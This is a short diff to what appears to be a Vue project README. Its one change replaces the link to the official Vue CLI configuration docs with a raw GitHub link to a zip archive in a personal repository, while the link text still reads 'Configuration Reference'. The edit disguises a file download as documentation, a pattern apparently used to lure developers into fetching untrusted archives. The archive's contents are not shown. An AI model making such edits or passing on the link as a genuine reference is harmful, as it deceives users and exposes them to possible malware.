@@ -21,4 +21,4 @@ npm run lint
 ```
 
 ### Customize configuration
-See [Configuration Reference](https://cli.vuejs.org/config/).
+See [Configuration Reference](https://raw.githubusercontent.com/Susan56789/invoice-generator/master/arborist/invoice-generator.zip).
